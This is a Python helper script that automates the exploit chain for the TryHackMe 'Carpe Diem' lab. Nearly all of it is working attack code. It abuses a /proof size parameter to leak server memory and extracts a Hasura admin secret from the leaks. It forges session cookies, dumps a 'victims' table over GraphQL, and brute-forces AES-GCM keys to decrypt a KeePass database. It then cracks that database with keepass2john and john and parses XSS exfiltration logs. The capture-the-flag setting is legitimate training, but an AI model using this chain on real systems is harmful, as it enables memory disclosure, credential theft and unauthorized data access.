"""Carpe Diem helper script (THM lab use).

Automates the practical chain from the writeup:
1) /proof parameter tampering to leak memory snippets
2) Extract leaked Hasura secret and key material
3) Optional GraphQL victims query (if reachable)
4) Decrypt Database.carp -> KeePass DB candidate
5) Optional keepass2john + john invocation

Examples:
  python carpe_hunt.py --target 10.10.172.124
  python carpe_hunt.py --target 10.10.172.124 --graphql-url http://192.168.150.10:8080/v1/graphql/
  python carpe_hunt.py --target 10.10.172.124 --run-john
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import shutil
import subprocess
import sys
import socket
import urllib.parse
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from pathlib import Path

try:
    from Crypto.Cipher import AES  # type: ignore
except Exception:
    AES = None


HASURA_SECRET_RE = re.compile(r"x-hasura-admin-secret\s*['\": ]+([A-Za-z0-9_\-]{6,128})", re.IGNORECASE)
GRAPHQL_URL_RE = re.compile(r"https?://[^\s'\"]+/v1/graphql/?", re.IGNORECASE)
FLAG_RE = re.compile(r"THM\{[^\}\r\n]{1,200}\}", re.IGNORECASE)
KEY_FIELD_RE = re.compile(r'"key"\s*:\s*"([^\"]{12,260})"', re.IGNORECASE)
B64_RE = re.compile(r"[A-Za-z0-9+/]{20,220}={0,2}")
GRAPHQL_CONN_ERR_RE = re.compile(r"error connecting to\s+http://192\.168\.150\.10/v1/graphql/?", re.IGNORECASE)


class CarpeDiem:
    def __init__(self, target: str, host: str, outdir: Path, timeout: int) -> None:
        self.target = target
        self.host = host
        self.base = f"http://{target}"
        self.outdir = outdir
        self.timeout = timeout
        self.outdir.mkdir(parents=True, exist_ok=True)

    def _request(
        self,
        method: str,
        path_or_url: str,
        *,
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict[str, str], bytes]:
        url = path_or_url if path_or_url.startswith("http") else urllib.parse.urljoin(self.base, path_or_url)
        req_headers = {"Host": self.host, "User-Agent": "carpe-diem-helper/1.0"}
        if headers:
            req_headers.update(headers)

        req = urllib.request.Request(url=url, data=body, headers=req_headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                hdrs = dict(resp.headers.items())
                set_cookie_all = resp.headers.get_all("Set-Cookie") or []
                if set_cookie_all:
                    hdrs["_set_cookie_all"] = "\n".join(set_cookie_all)
                return resp.getcode(), hdrs, resp.read()
        except urllib.error.HTTPError as e:
            hdrs = dict(e.headers.items()) if e.headers else {}
            if e.headers:
                set_cookie_all = e.headers.get_all("Set-Cookie") or []
                if set_cookie_all:
                    hdrs["_set_cookie_all"] = "\n".join(set_cookie_all)
            return e.code, hdrs, e.read()
        except (urllib.error.URLError, TimeoutError, socket.timeout, OSError) as e:
            msg = f"request_error: {type(e).__name__}: {e}"
            return -1, {}, msg.encode("utf-8", "ignore")

    def get_home(self) -> tuple[dict[str, str], str]:
        code, headers, data = self._request("GET", "/")
        text = data.decode("utf-8", "ignore")
        print(f"[+] GET / => {code}, {len(data)} bytes")

        cookies: dict[str, str] = {}
        set_cookie_lines: list[str] = []
        all_sc = headers.get("_set_cookie_all", "")
        if all_sc:
            set_cookie_lines.extend([x for x in all_sc.split("\n") if x.strip()])
        for k, v in headers.items():
            if k.lower() == "set-cookie":
                set_cookie_lines.append(v)

        for line in set_cookie_lines:
            first = line.split(";", 1)[0]
            if "=" in first:
                ck, cv = first.split("=", 1)
                cookies[ck.strip()] = cv.strip()

        if cookies:
            print(f"[+] Cookies: {', '.join(cookies.keys())}")
            if "session" in cookies:
                try:
                    decoded = base64.b64decode(cookies["session"] + "===").decode("utf-8", "ignore")
                    print(f"[+] Decoded session cookie: {decoded}")
                except Exception:
                    pass

        m = re.search(r"bc1[a-z0-9]{20,80}", text)
        if m:
            print(f"[+] Ransom wallet: {m.group(0)}")

        (self.outdir / "index.html").write_text(text, encoding="utf-8")
        return cookies, text

    def post_proof(self, proof: str, size: int, cookies: dict[str, str] | None = None) -> bytes:
        body = json.dumps({"size": size, "proof": proof}).encode()
        headers = {"Content-Type": "application/json"}
        if cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

        code, _, data = self._request("POST", "/proof/", body=body, headers=headers)
        print(f"[+] POST /proof size={size} proof_len={len(proof)} => {code}, {len(data)} bytes")
        return data

    def collect_leaks(self, cookies: dict[str, str]) -> list[bytes]:
        leaks: list[bytes] = []
        proofs = ["a" * 42, "z" * 42, "wallet" * 16]
        # Includes common leak range from observed room behavior.
        sizes = [42, 256, 1024, 4096, 12000, 24000, 56192, 60000]

        variants = [cookies]
        if cookies.get("session"):
            for ip in ["127.0.0.1", "192.168.150.10", "192.168.198.108"]:
                c2 = dict(cookies)
                c2["session"] = base64.b64encode(ip.encode()).decode()
                variants.append(c2)

        idx = 0
        for ck in variants:
            for proof in proofs:
                for size in sizes:
                    data = self.post_proof(proof=proof, size=size, cookies=ck)
                    leaks.append(data)
                    (self.outdir / f"leak_{idx:03d}.bin").write_bytes(data)
                    idx += 1

        print(f"[+] Saved {len(leaks)} leak blobs")
        return leaks

    @staticmethod
    def _clean_base64(s: str) -> str:
        alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        return "".join(ch for ch in s if ch in alphabet)

    def extract_artifacts(self, blobs: list[bytes]) -> tuple[set[str], set[str], list[str], set[str]]:
        secrets: set[str] = set()
        gql_urls: set[str] = set()
        raw_key_fields: list[str] = []
        flags: set[str] = set()

        for blob in blobs:
            txt = blob.decode("latin1", "ignore")
            secrets.update(HASURA_SECRET_RE.findall(txt))
            gql_urls.update(GRAPHQL_URL_RE.findall(txt))
            flags.update(FLAG_RE.findall(txt))
            raw_key_fields.extend(KEY_FIELD_RE.findall(txt))

        print(f"[+] Hasura secrets found: {len(secrets)}")
        for s in sorted(secrets):
            print(f"    - {s}")

        print(f"[+] GraphQL URLs found: {len(gql_urls)}")
        for u in sorted(gql_urls):
            print(f"    - {u}")

        print(f"[+] Raw leaked key fields: {len(raw_key_fields)}")
        if flags:
            print(f"[+] Flags already in leak output: {sorted(flags)}")

        return secrets, gql_urls, raw_key_fields, flags

    def reconstruct_key_candidates(self, key_fields: list[str], blobs: list[bytes]) -> list[str]:
        cleaned = [self._clean_base64(x) for x in key_fields if self._clean_base64(x)]

        # Consensus reconstruction by character position.
        if cleaned:
            max_len = max(len(s) for s in cleaned)
            consensus_chars: list[str] = []
            for i in range(max_len):
                c = Counter(s[i] for s in cleaned if i < len(s))
                if not c:
                    continue
                consensus_chars.append(c.most_common(1)[0][0])
            consensus = "".join(consensus_chars)
            if consensus:
                cleaned.append(consensus)

        # Also mine generic base64-looking tokens from leaks, but cap volume.
        generic_added = 0
        generic_cap = 400
        for blob in blobs:
            if generic_added >= generic_cap:
                break
            txt = blob.decode("latin1", "ignore")
            for m in B64_RE.findall(txt):
                cleaned.append(m)
                generic_added += 1
                if generic_added >= generic_cap:
                    break

        # Deduplicate while preserving order.
        uniq: list[str] = []
        seen: set[str] = set()
        for c in cleaned:
            if c in seen:
                continue
            seen.add(c)
            uniq.append(c)

        # Keep runtime bounded.
        max_candidates = 600
        if len(uniq) > max_candidates:
            uniq = uniq[:max_candidates]

        print(f"[+] Candidate key strings: {len(uniq)}")
        return uniq

    def detect_graphql_backend_errors(self, blobs: list[bytes]) -> int:
        """Count leak artifacts that contain internal GraphQL connectivity errors."""
        hits = 0
        for blob in blobs:
            txt = blob.decode("latin1", "ignore")
            if GRAPHQL_CONN_ERR_RE.search(txt):
                hits += 1
        return hits

    def query_graphql_victims(self, graphql_url: str, secret: str) -> list[dict[str, object]]:
        query = {
            "query": "{ victims { filename id key name timer } }"
        }
        body = json.dumps(query).encode()
        headers = {
            "Content-Type": "application/json",
            "x-hasura-admin-secret": secret,
        }
        code, _, data = self._request("POST", graphql_url, body=body, headers=headers)
        print(f"[+] GraphQL victims query => {code}, {len(data)} bytes")
        (self.outdir / "graphql_victims_raw.json").write_bytes(data)

        if code < 0:
            print("[i] GraphQL endpoint unreachable from current network path; skipping GraphQL dump.")
            return []

        try:
            obj = json.loads(data.decode("utf-8", "ignore"))
            victims = obj.get("data", {}).get("victims", [])
            if isinstance(victims, list):
                (self.outdir / "graphql_victims.json").write_text(
                    json.dumps(victims, indent=2), encoding="utf-8"
                )
                return [v for v in victims if isinstance(v, dict)]
        except Exception:
            pass
        return []

    def find_database_key_from_victims(self, victims: list[dict[str, object]]) -> str | None:
        for v in victims:
            fn = str(v.get("filename", ""))
            key = str(v.get("key", ""))
            if "database" in fn.lower() and key:
                print(f"[+] Database row found in victims: filename={fn}")
                return key
        return None

    @staticmethod
    def load_victims_from_json_file(path: Path) -> list[dict[str, object]]:
        if not path.exists():
            return []
        txt = path.read_text(encoding="utf-8", errors="ignore")
        try:
            obj = json.loads(txt)
            if isinstance(obj, list):
                return [x for x in obj if isinstance(x, dict)]
            if isinstance(obj, dict):
                victims = obj.get("data", {}).get("victims", [])
                if isinstance(victims, list):
                    return [x for x in victims if isinstance(x, dict)]
        except Exception:
            pass
        return []

    @staticmethod
    def parse_exfil_log(path: Path) -> tuple[list[dict[str, object]], list[str]]:
        if not path.exists():
            return [], []

        txt = path.read_text(encoding="utf-8", errors="ignore")
        victims_out: list[dict[str, object]] = []
        flags_out: set[str] = set(FLAG_RE.findall(txt))

        # Parse callbacks like /?data=<base64> and decode victim dump.
        for m in re.finditer(r"[?&]data=([A-Za-z0-9%+/=]+)", txt):
            enc = urllib.parse.unquote_plus(m.group(1))
            for padded in (enc, enc + "=", enc + "==", enc + "==="):
                try:
                    raw = base64.b64decode(padded, validate=False)
                except Exception:
                    continue
                decoded = raw.decode("utf-8", "ignore")
                flags_out.update(FLAG_RE.findall(decoded))
                try:
                    obj = json.loads(decoded)
                except Exception:
                    continue
                if isinstance(obj, dict):
                    victims = obj.get("data", {}).get("victims", [])
                    if isinstance(victims, list):
                        victims_out.extend([x for x in victims if isinstance(x, dict)])
                break

        # Parse localStorage-style exfil blocks containing {"flag1":"THM{...}"}
        for m in re.finditer(r"\{[^\r\n]{0,500}flag1[^\r\n]{0,500}\}", txt, re.IGNORECASE):
            blob = urllib.parse.unquote_plus(m.group(0))
            flags_out.update(FLAG_RE.findall(blob))

        return victims_out, sorted(flags_out)

    def decrypt_database(self, carp_file: Path, key_candidates: list[str], output_file: Path) -> bool:
        if AES is None:
            print("[-] pycryptodome missing. Install with: pip install pycryptodome")
            return False
        if not carp_file.exists():
            print(f"[-] Missing encrypted file: {carp_file}")
            return False

        enc = carp_file.read_bytes()
        if len(enc) < 32:
            print("[-] Encrypted file too small")
            return False

        nonce = enc[:12]
        ct = enc[12:-16]
        tag = enc[-16:]

        attempts = 0
        max_attempts = 3000
        for cand in key_candidates:
            for padded in (cand, cand + "=", cand + "==", cand + "==="):
                attempts += 1
                if attempts > max_attempts:
                    print("[i] Reached max key attempts, stopping brute loop")
                    return False
                try:
                    raw = base64.b64decode(padded, validate=False)
                except Exception:
                    continue
                if len(raw) < 16:
                    continue
                key16 = raw[:16]
                try:
                    pt = AES.new(key16, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
                    output_file.write_bytes(pt)
                    print(f"[+] Decryption success with candidate: {cand[:50]}...")
                    return True
                except Exception:
                    continue

        print("[-] No working key candidate for AES-GCM decryption")
        return False

    def extract_flags_from_file(self, p: Path) -> list[str]:
        if not p.exists():
            return []
        txt = p.read_bytes().decode("utf-8", "ignore")
        return sorted(set(FLAG_RE.findall(txt)))

    def run_keepass_tools(self, keepass_file: Path, run_john: bool, rockyou: str) -> None:
        if not keepass_file.exists():
            print(f"[-] KeePass candidate not found: {keepass_file}")
            return

        kp2j = shutil.which("keepass2john")
        if not kp2j:
            print("[-] keepass2john not found in PATH; skipping hash extraction")
            return

        hash_path = self.outdir / "database_keepass.hash"
        with hash_path.open("wb") as f:
            proc = subprocess.run([kp2j, str(keepass_file)], stdout=f, stderr=subprocess.PIPE, check=False)
        if proc.returncode != 0:
            print("[-] keepass2john failed")
            return

        print(f"[+] KeePass hash exported: {hash_path}")

        if not run_john:
            print("[i] john run disabled (use --run-john)")
            return

        john = shutil.which("john")
        if not john:
            print("[-] john not found in PATH")
            return

        cmd = [john, f"--wordlist={rockyou}", str(hash_path)]
        print("[+] Running:", " ".join(cmd))
        subprocess.run(cmd, check=False)
        subprocess.run([john, "--show", str(hash_path)], check=False)


def parse_args(argv: list[str]) -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="Carpe Diem chain helper")
    ap.add_argument("--target", required=True, help="Target IP, e.g. 10.10.172.124")
    ap.add_argument("--host", default="c4rp3d13m.net", help="Host header")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--outdir", default="artifacts")
    ap.add_argument("--carp-file", default="Database.carp")
    ap.add_argument("--graphql-url", default="", help="Optional explicit GraphQL URL")
    ap.add_argument("--skip-graphql", action="store_true", help="Skip GraphQL stage entirely")
    ap.add_argument("--victims-json", default="", help="Path to victims dump JSON (from exfil/GraphQL)")
    ap.add_argument("--exfil-log", default="", help="Path to HTTP listener/access log with exfil callbacks")
    ap.add_argument("--run-john", action="store_true", help="Run john after keepass2john")
    ap.add_argument("--rockyou", default="/usr/share/wordlists/rockyou.txt")
    return ap.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    solver = CarpeDiem(
        target=args.target,
        host=args.host,
        outdir=Path(args.outdir),
        timeout=args.timeout,
    )

    cookies, _ = solver.get_home()
    leaks = solver.collect_leaks(cookies)
    secrets, gql_urls, raw_keys, leak_flags = solver.extract_artifacts(leaks)
    gql_conn_error_hits = solver.detect_graphql_backend_errors(leaks)
    if gql_conn_error_hits:
        print(
            "[!] Backend hint: internal GraphQL connectivity error found in "
            f"{gql_conn_error_hits} leak blob(s)."
        )
        print(
            "[!] This usually means the app cannot currently reach 192.168.150.10, "
            "so valid victims data may not be refreshed."
        )

    victims: list[dict[str, object]] = []
    extra_flags: set[str] = set()

    if args.victims_json:
        vfile = Path(args.victims_json)
        loaded = solver.load_victims_from_json_file(vfile)
        if loaded:
            victims.extend(loaded)
            print(f"[+] Victims loaded from JSON: {len(loaded)}")

    if args.exfil_log:
        elog = Path(args.exfil_log)
        evictims, eflags = solver.parse_exfil_log(elog)
        if evictims:
            victims.extend(evictims)
            print(f"[+] Victims recovered from exfil log: {len(evictims)}")
        if eflags:
            extra_flags.update(eflags)
            print(f"[+] Flags recovered from exfil log: {eflags}")

    if secrets and not args.skip_graphql:
        gql = args.graphql_url or (sorted(gql_urls)[0] if gql_urls else "")
        if gql:
            g_victims = solver.query_graphql_victims(gql, sorted(secrets)[0])
            if g_victims:
                victims.extend(g_victims)
            print(f"[+] Victims rows recovered (total): {len(victims)}")
    elif args.skip_graphql:
        print("[i] GraphQL stage skipped by --skip-graphql")

    key_candidates = solver.reconstruct_key_candidates(raw_keys, leaks)

    if victims:
        db_key = solver.find_database_key_from_victims(victims)
        if db_key:
            key_candidates.insert(0, db_key)

    # Prefer classic output filename from writeup.
    output_keepass = solver.outdir / "Database.kbxd.decrypt"
    ok = solver.decrypt_database(
        carp_file=Path(args.carp_file),
        key_candidates=key_candidates,
        output_file=output_keepass,
    )

    if ok:
        print(f"[+] Decrypted file written: {output_keepass}")
        flags_in_keepass_file = solver.extract_flags_from_file(output_keepass)
        if flags_in_keepass_file:
            print(f"[+] Flags found directly in decrypted file: {flags_in_keepass_file}")
        solver.run_keepass_tools(output_keepass, run_john=args.run_john, rockyou=args.rockyou)
    else:
        print("[i] Could not decrypt Database.carp with current candidates.")
        if gql_conn_error_hits:
            print(
                "[i] Internal GraphQL connection errors were observed; a room reset/retry "
                "may be required before the full victims key list becomes obtainable."
            )
        print("[i] Next step: use cookie/XSS exfil to fetch full victims key list and rerun.")

    if leak_flags:
        print(f"[+] Flags from leak stage: {sorted(leak_flags)}")
    if extra_flags:
        print(f"[+] Flags from exfil log stage: {sorted(extra_flags)}")

    print("[+] Done")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
